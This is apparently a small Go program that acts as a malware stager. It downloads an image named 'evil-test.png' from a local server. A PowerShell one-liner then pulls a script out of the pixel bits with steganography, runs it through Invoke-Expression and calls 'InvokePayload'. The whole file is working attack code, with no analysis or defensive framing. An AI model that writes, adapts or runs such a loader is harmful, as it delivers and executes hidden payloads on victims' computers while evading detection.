package main
import ("os";"os/exec";"net/http";"io")

func downloadFile(filepath string, url string) (err error) {
  // Create the file
  out, err := os.Create(filepath)
  if err != nil  {
    return err
  }
  defer out.Close()

  resp, err := http.Get(url)
  if err != nil {
    return err
  }
  defer resp.Body.Close()

  _, err = io.Copy(out, resp.Body)
  if err != nil  {
    return err
  }

  return nil
}



func main() {
	var url string = "http://localhost:8000/evil-test.png"
	downloadFile("mia.png", url)
	var params string = `$path = -join($pwd.path, "\mia.png"); sal a New-Object;Add-Type -AssemblyName "System.Drawing";$g= a System.Drawing.Bitmap($path);$o= a Byte[] 8000;(0..3)|% {foreach($x in (0..1999)){$p=$g.GetPixel($x,$_);$o[$_*2000+$x]=([math]::Floor(($p.B -band 15)*16) -bor ($p.G -band 15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..7647])); .\mia.png; del .\mia.png.exe; InvokePayload`
	exec.Command("powershell", params).Start()
}